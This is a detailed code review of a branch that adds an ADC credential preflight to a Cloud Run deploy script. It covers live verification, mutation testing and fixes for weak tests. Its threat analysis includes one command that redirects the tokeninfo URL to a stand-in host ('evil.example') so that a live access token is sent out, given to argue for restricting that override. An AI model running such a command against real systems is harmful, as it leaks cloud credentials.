# `fix/adc-preflight` (ptone/scion, 82fe8e8): ADC credential preflight on `deploy.sh` — Review

Reviewer: sn-adcpreflight-rev. Date: 2026-08-27. Task #85.
Base: `c13d910b`. 3 files, +322/-6.

## Executive Summary

The change is **functionally correct and both load-bearing properties hold in reality**: I broke ADC
and the script created nothing (P1), and after a real deploy `iapEnabled` is `true` (P2). Risk level:
**MEDIUM** — not from the shipped behaviour, but from the test suite, which does not pin either of the
two defects being fixed, plus one real behavioural defect in the identity-mismatch warning.

**Verdict: pass-with-findings.** Nothing here should block the fix reaching ptone; the Required items
are cheap and should land before it does.

---

## Property verification

| Property | Result | Evidence |
|---|---|---|
| **P1** nothing created before the credential is proven | **VERIFIED** (both ways) | code trace + two real runs, below |
| **P2** `iapEnabled` true after a real deploy | **VERIFIED** | v2 GET readback, below |
| **P3** identity comparison exists and compares | **VERIFIED, but defective** — see Required 3 | exercised live |
| **P4** no token reaches stdout | **VERIFIED** (stdout), with a caveat — see Optional 3 | grep of all 16 expansions |
| **P5** `_DI_API_BASE` / `_DI_TOKENINFO_URL` seams | judgement below: **narrow them** | |
| **P6** is the ORDER tested? | **NO — confirmed by mutation** | see Required 1 |

### P1 — by reading

`di_main` order is: flag parse → `di_check_gcloud_instances` → step 1 `gcloud config get account`
(read) → step 2 `gcloud projects describe` (read) → URL/registry computation (pure) →
**preflight (line 597)** → **step 3a create (line 609)**. Everything above the preflight is read-only
or pure. The preflight is genuinely before the first mutation, not merely before step 3b.

### P1 — by running (two real negative tests)

**How I broke ADC:** `GOOGLE_APPLICATION_CREDENTIALS=/nonexistent/adc.json`. I verified first that this
breaks *only* the ADC store: `gcloud config get account` still returned the account and
`gcloud projects describe ptone-experiments` still returned `721899303052`, while
`gcloud auth application-default print-access-token` failed with
`File /nonexistent/adc.json was not found.` So the abort is attributable to missing ADC and nothing else.

Result: script exited **1** at the preflight, naming `gcloud auth application-default login`. Instance
count in `ptone-experiments/us-east4` was **9 before and 9 after**, and `sn-adcpf-rev` did not exist.

**Second, independent negative test — a real non-2xx, not a stub.** I found a project where the
impersonated SA has `projects.describe` but not `run.instances.list` (`serverless-team-scion`). Steps 1
and 2 passed, a real ADC token was minted, and the validating GET returned a genuine **HTTP 403
PERMISSION_DENIED**. Script exited 1 before step 3a. This is the abort-before-create path exercised
end-to-end against the live API.

### P2 — IAP is actually ON

Real deploy of `sn-adcpf-rev` completed, exit **0**, URL `https://sn-adcpf-rev-721899303052.us-east4.run.app`.
The REST PATCH is intact in the diff (step 3b, lines 663–668) — it was not "simplified" away. v2 readback:

```
HTTP 200
"invokerIamDisabled": true,
"iapEnabled": true,
```

Unauthenticated fetch of the URL returns **302** to `accounts.google.com/o/oauth2/v2/auth?...` with body
`Invalid IAP credentials: empty token`. IAP login is presented. Walk items 1, 2 and 3 all pass.

---

## Critical

None.

## Required

### Required 1 — No test pins the ordering. The ordering defect is the defect being fixed. (P6)

Your prediction was exactly right. I confirmed it by mutation rather than by reading: I moved the
entire preflight block from before step 3a to after `Instance deployed successfully.`, i.e. I
**reintroduced the original defect in full**, and then ran the suite.

```
go test ./cmd/ -run TestScript   →  ok    (all 31 tests pass)
shellcheck                       →  CLEAN
```

A suite that is green with the bug restored has not tested the fix. All four new tests call
`di_preflight_rest_credential` directly, so they are invariant to where — or whether — it is called.

**Fix (cheap, as you said):** add one test that runs `di_main` with a stubbed `gcloud` recording its
argv to a file, and assert the ADC `print-access-token` call is recorded *before* the
`beta run instances deploy` call. Asserting on the order of the `==> Step` banners in stdout is an
acceptable alternative.

### Required 2 — No test pins the ADC token source, and one test is non-hermetic

I reverted line 245 to the original buggy `gcloud auth print-access-token` and re-ran the four new tests:

```
--- PASS: TestScriptPreflightFailsWithoutADC
--- PASS: TestScriptPreflightAbortsOnNon2xxGet
--- PASS: TestScriptPreflightWarnsOnIdentityMismatch
--- PASS: TestScriptPreflightSucceedsWithMatchingIdentity
```

**All four pass against the code with Defect 1 restored.** Three of them mock `gcloud()` as
`{ echo "ya29.fake-test-token" }`, which answers *any* gcloud invocation, so they cannot distinguish the
two credential stores.

`TestScriptPreflightFailsWithoutADC` is worse. Its mock intercepts only the exact 3-arg ADC form and
otherwise falls through to `command gcloud "$@"`, and unlike the other three it does **not** set
`_DI_API_BASE`/`_DI_TOKENINFO_URL`. With the reverted source I traced what it actually does:

```
    ADC token minted (1024 chars, prefix: ya29...)
    ADC identity: scion-instance-gym@serverless-team-scion.iam.gserviceaccount.com
    GET https://us-east4-run.googleapis.com/v2/projects/test-project/locations/us-east4/instances
Error: ... returned HTTP 403: "Cloud Run Admin API has not been used in project test-project..."
Fix: run 'gcloud auth application-default login' and retry.
```

It mints a **real 1024-char access token**, sends it to the **real `oauth2.googleapis.com/tokeninfo`**,
and calls the **real Cloud Run API** for a nonexistent project — then passes because the generic remedy
string happens to appear in stderr. So the assertion is satisfied for entirely the wrong reason, and a
unit test run puts a live `cloud-platform`-scoped credential on the network.

**Fix:** point `_DI_API_BASE` and `_DI_TOKENINFO_URL` at the stub in **all four** tests so no test can
reach the internet, and have the gcloud mock append its `"$@"` to a file that the test asserts contains
`auth application-default print-access-token`. That single assertion pins Defect 1.

### Required 3 — The mismatch warning is a guaranteed false positive whenever tokeninfo omits `email`

You asked me to confirm the missing-email case prints something useful. It prints something — but the
comparison built on top of it is invalid.

Measured in this container, ADC tokeninfo returns **no email**:

```json
{"azp":"110532853671892060667","aud":"110532853671892060667",
 "scope":"https://www.googleapis.com/auth/cloud-platform","access_type":"online"}
```

The script falls back to `azp`, a **numeric client ID**, and then compares it to `$operator_email`, an
**email address** (line 296). Those two can never be equal, so the warning fires unconditionally. On my
real deploy it did:

```
    ADC identity: 110532853671892060667

    WARNING: ADC identity does not match the active gcloud account.
      gcloud account: scion-my-grove@deploy-demo-test.iam.gserviceaccount.com
      ADC identity:   110532853671892060667
```

and the deploy then succeeded, because in that run both paths were in fact executing as
`scion-instance-gym`. The warning was wrong. Any SA-based ADC — metadata server, GCE, Cloud Shell, CI —
gets this on **every** run, which is alarm fatigue on the exact signal P3 exists to provide. It also
names an opaque numeric ID the operator cannot map to an account.

This does satisfy the letter of your requirement (not empty, not `null`), so flag it as you see fit —
but as built the check cannot do its job in the service-account case.

**Fix (3 lines):** only run the comparison when the `email` claim was present. When it was not, print
the `azp` as informational and say the comparison was skipped, e.g.
`ADC identity: client ID 110532853671892060667 (no email claim — cannot compare with gcloud account)`.

---

## Nit / Optional

1. **Optional — the 403 remedy is misleading.** Both the 401 and 403 paths print
   `Fix: run 'gcloud auth application-default login' and retry.` On the real 403 I triggered, the token
   was perfectly valid; the problem was a missing IAM role. Re-logging in will not fix it. Suggest
   branching: 401 → re-auth; 403 → name the missing permission (`run.instances.list`) and the project.
2. **Nit — dead parameter.** `local name="$4"` (line 236) is never used in the function. Either drop the
   parameter and the argument at the call site, or use it in the messages.
3. **Optional — the token is on the curl command line.** Line 277 sends the token as a URL query
   parameter (`?access_token=${tok}`), so it is visible in `ps`/`/proc/<pid>/cmdline` to other local
   users and is logged by the receiving host. It never reaches stdout, so P4 as written is satisfied.
   `tokeninfo` only accepts the token this way, so this is inherent — but it is the reason P5 matters.
4. **Nit — empty `http_code` passes the gate.** `[[ "$http_code" -ge 300 ]]` treats an empty string as 0,
   so an empty `curl -w` result would be read as success. Not reachable today (curl's non-zero exit is
   caught by the `||` block) but a `[[ -z "$http_code" ]]` guard is one line. Same shape exists in the
   pre-existing step 3b, so this is not a regression.

---

## FYI

- **`_di_adc_token` is clean.** No `export` anywhere in the file; it is `local` to `di_main` (line 599)
  and initialised to `""` before the call, so `set -u` cannot trip and it does not reach any child
  process environment. One wrinkle: called standalone (as the tests do) without a pre-declared local,
  line 340 creates a **global**. Harmless in the script's only real call path.
- **The `set -e` masking trap is correctly handled.** Every new command-substitution assignment uses the
  split form (`local x` then `x="$(...)"`): `tok`, `adc_stderr_file`, `tokeninfo_resp`, `adc_identity`,
  `resp_file`, `http_code`. No `local x="$(cmd)"` was introduced. Six for six.
- **No `2>/dev/null` in new code.** The only occurrence in the added lines is inside a comment. The
  preflight captures stderr to a temp file and prints it on failure, which is what you asked for.
- **Dependency set did not grow.** Both base and branch use exactly
  `awk curl gcloud grep mktemp sed cat head tr rm sleep`. No `jq`, no `python3`, no `source`, no sibling
  files. The curl-able path is intact.
- **`shellcheck` 0.9.0 is clean** on the branch, and clean at `-S style`.

---

## P5 judgement — you asked for a call, not a reflex

**My call: fine in principle, but narrow `_DI_TOKENINFO_URL` — it is cheap and the asymmetry is real.**

The "an attacker who can set your environment has already won" argument is sound for a script an
operator runs in their own shell, and I would accept it for `_DI_API_BASE`. I do not accept it for
`_DI_TOKENINFO_URL`, for two reasons specific to this file:

1. The script is documented as curl-able. `_DI_TOKENINFO_URL=https://evil.example bash <(curl ...)` is a
   plausible copy-paste accident, not a targeted attack, and it exfiltrates a live
   `cloud-platform`-scoped token.
2. **The redirection is invisible.** The script echoes the API GET URL (`echo "    GET $list_url"`) but
   never echoes the tokeninfo URL. So a redirected credential produces output indistinguishable from a
   normal run. That asymmetry is what tips this for me — combined with the token being in the query
   string (Optional 3), where the receiving host logs it.

One sentence for the design doc: *the API-base override is acceptable because it only redirects a Bearer
header the operator already controls, but the tokeninfo override places a live credential in a URL sent
to an arbitrary host with no visible sign, so it is restricted to `googleapis.com` and the URL is
printed.*

**Concrete remedy, in order of cost:** (a) echo the tokeninfo URL exactly as the GET URL is echoed —
one line, makes redirection visible; (b) reject `_DI_TOKENINFO_URL` values whose host is not
`*.googleapis.com`; (c) comment both seams in the source as test-only. I would take all three; (a) alone
would satisfy me. Given `#84` was test-mode blindness on this same file, the precedent argues for the
comment at minimum.

---

## Test Coverage

Four new tests, all well-written as unit tests of the function and all asserting on behaviour rather
than implementation. They do cover the three things the dev brief asked for. But per Required 1 and 2,
**none of them would fail if either defect were reintroduced**, which is the coverage question that
matters here. The gap is in what is pinned, not in test quality per se.

Also still true, and unchanged by this branch: step 6 remains untested since
`GoogleCloudPlatform/scion#1325` dropped the two "does not panic" pins.

## Backward Compatibility

No wire-format or flag-surface changes. One genuine behaviour change for operators: the script now
hard-fails without ADC where it previously proceeded and failed later. That is the point of the change,
and the docs change adds the ADC prerequisite. The docs edit is accurate and well-pitched.

## Positive Feedback

- The preflight is placed correctly and the placement is the hard part of this change.
- Capturing gcloud's stderr to a temp file and printing it on failure, instead of `2>/dev/null`, is
  exactly right and is better than the pre-existing code around it.
- Token reuse between preflight and step 3b (rather than minting twice) with a defensive empty-check at
  the reuse site.
- Every new command-substitution assignment avoids the `local x="$(cmd)"` trap. Given five prior bugs of
  that shape in this file, six-for-six is worth saying.

## Gates run

| Gate | Result |
|---|---|
| `go test ./cmd/ -run TestScript` | **31 pass, 1 skip, 0 fail** (32 `TestScript*` funcs) |
| `go test ./cmd/` (whole package) | **525 pass, 0 fail** |
| `shellcheck 0.9.0` | **clean** (also clean at `-S style`) |
| Real deploy walk (`ptone-experiments`/`us-east4`) | **pass** — exit 0, `iapEnabled: true`, IAP 302 |
| P1 negative (broken ADC) | **pass** — exit 1, 0 resources created |
| P1 negative (real 403) | **pass** — exit 1, aborted before step 3a |
| Mutation: reorder preflight after 3a | **suite still green** → Required 1 |
| Mutation: revert ADC token source | **suite still green** → Required 2 |

Post-rebase onto current upstream `main`: tests pass and shellcheck is clean.

## Rebase (§7)

`ahead 1 / behind 2` against current upstream `main`. The two upstream commits are
`2c4990e` (`GoogleCloudPlatform/scion#1326`, design doc) and `e201b6c`
(`GoogleCloudPlatform/scion#1330`, `hub_id` design doc) — both docs-only, no file overlap.
**`git rebase` onto upstream `main` succeeds cleanly**, and the suite and shellcheck are green after it.
A rebase is not required for correctness but is worth doing so the compare URL does not look stale.

## Instances

Created `sn-adcpf-rev` (deleted). The two aborted runs created nothing. Final list in
`ptone-experiments/us-east4` is **9 instances, identical to baseline**: `e2e-omni`, `e2e-walk-r2`,
`iap-demo`, `q2-control`, `sn-adminfix-t`, `sn-adminseed-t`, `sn-ready`, `sn-step6`, `sn-walk`. No
instance that was not mine was touched.

## Corrections to the review brief

You asked to be told what is wrong in the brief. Four things; none changes the outcome.

1. **§2 P1 — `CLOUDSDK_CONFIG` at an empty temp dir would have given you a false pass.** You offered it
   as "one way to break ADC". It also breaks `gcloud config get account` and `gcloud projects describe`,
   so the script dies at **step 1 or 2, above the preflight**, and never reaches the code under test —
   the exact "failure caused by something other than missing ADC" you warned about. I used
   `GOOGLE_APPLICATION_CREDENTIALS=/nonexistent/adc.json` instead and verified steps 1 and 2 still
   succeed under it before trusting the result. Recommend the brief switch to that mechanism.

2. **§2 P2 / dev-brief §3 — "there is no gcloud flag that ENABLES IAP" is right for this script but the
   stated reasoning is not.** gcloud 582 **does** have an `--iap` flag
   (`AddIapFlag`, `command_lib/run/flags.py:388`). It is registered on the **Services** surface only —
   `gcloud run deploy`, `gcloud run services update`, `gcloud run services dev sync` — and **not** on
   the `instances` noun this script uses. Worse, `gcloud beta run instances deploy --help` describes
   `--public` as *"Equivalent to setting --no-invoker-iam-check and --no-iap"*, referencing a flag that
   surface does not expose. So a future reader grepping the help text will find `--iap`, conclude the
   PATCH is removable, and be wrong. Suggest restating the constraint as **"`--iap` exists on Services,
   not on `run instances`; the PATCH is the only way to enable IAP on an Instance"**, which is both true
   and durable. Your conclusion stands and the branch correctly keeps the PATCH.

3. **§4 — the 28 tests are spread over two files, not one.** `cmd/deploy_script_test.go` had 23 at base;
   the other 5 are in `cmd/deploy_script_pin_test.go`. Your count of 28 is correct, the attribution is
   not. Worth knowing because the pin file is where an ordering pin (Required 1) most naturally belongs.

4. **FYI, not a brief error** — `TestScriptCheckGcloudInstances_FailureMessage` **skips** on gcloud 582,
   because it can only run where `beta run instances` is absent. Pre-existing and unrelated to this
   branch, but it means the count you see depends on the SDK version of the runner, which is a trap of
   the same family as the step-6 gap you flagged.

Two of your predictions were dead on and I want that on the record: P6 (the tests cannot detect a
reordering) and P3 (the identity check being the part most likely to be under-built). Both confirmed by
measurement.

## Final Verdict

**REQUEST CHANGES** on the test suite (Required 1, 2) and the mismatch comparison (Required 3).
Overall disposition **pass-with-findings** — the shipped behaviour is correct and verified in reality;
what is missing is the coverage that would keep it correct.
